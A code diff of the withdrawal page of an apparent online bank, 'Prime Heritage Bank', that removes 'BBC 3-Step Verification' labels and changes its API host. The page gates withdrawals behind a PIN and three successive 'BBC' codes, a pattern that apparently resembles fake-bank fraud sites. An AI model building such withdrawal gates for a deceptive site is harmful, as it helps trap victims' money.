@@ -396,8 +396,8 @@
         <div class="card">
             <div class="title">
                 <h2><i class="fas fa-university"></i> Withdraw to Bank</h2>
-                <p>Secure withdrawal with BBC 3-step verification</p>
-                <div class="bbc-badge"><i class="fas fa-shield-alt"></i> BBC 3-Step Verification</div>
+                <p>Secure withdrawal</p>
+                <div class="bbc-badge"><i class="fas fa-shield-alt"></i> EASY TRANSACTION</div>
             </div>
 
             <div class="info-box">
@@ -406,8 +406,8 @@
                     <span class="info-value" id="userBalance">$0.00</span>
                 </div>
                 <div class="info-row" style="margin-top:8px;">
-                    <span class="info-label"><i class="fas fa-shield-alt"></i> Security Level</span>
-                    <span class="info-value" style="font-size:14px;">🔐 BBC 3-Step</span>
+                    <span class="info-label"><i class="fas fa-shield-alt"></i> SECURED</span>
+                    <span class="info-value" style="font-size:14px;">🔐</span>
                 </div>
             </div>
 
@@ -441,13 +441,13 @@
                         <input type="password" maxlength="1" id="pin4">
                     </div>
                 </div>
-                <button class="btn" onclick="withdrawStep1()"><i class="fas fa-arrow-right"></i> Continue to Security</button>
+                <button class="btn" onclick="withdrawStep1()"><i class="fas fa-arrow-right"></i> Continue</button>
             </div>
 
             <div id="codeForm" style="display: none;">
                 <div id="codeStep1">
                     <div class="security-step">
-                        <span class="step-badge"><i class="fas fa-shield-alt"></i> Step 1 of 3 - Authorization</span>
+                        <span class="step-badge"><i class="fas fa-shield-alt"></i> Authorization</span>
                     </div>
                     <div class="form-group">
                         <label><i class="fas fa-key"></i> Enter BBC Authorization Code</label>
@@ -465,7 +465,7 @@
 
                 <div id="codeStep2" style="display: none;">
                     <div class="security-step">
-                        <span class="step-badge"><i class="fas fa-lock"></i> Step 2 of 3 - Security Check</span>
+                        <span class="step-badge"><i class="fas fa-lock"></i> Security Check</span>
                     </div>
                     <div class="form-group">
                         <label><i class="fas fa-shield-virus"></i> Enter BBC Security Code</label>
@@ -483,7 +483,7 @@
 
                 <div id="codeStep3" style="display: none;">
                     <div class="security-step">
-                        <span class="step-badge"><i class="fas fa-crown"></i> Step 3 of 3 - Final Verification</span>
+                        <span class="step-badge"><i class="fas fa-crown"></i> Final Verification</span>
                     </div>
                     <div class="form-group">
                         <label><i class="fas fa-gem"></i> Enter BBC Final Code</label>
@@ -516,7 +516,7 @@
     </div>
 
     <script>
-        const API_URL = 'https://prime-heritage-bank.onrender.com';
+        const API_URL = 'https://primeheritagebank.onrender.com';
         let currentRef = null;
 
         function setTheme(theme) {
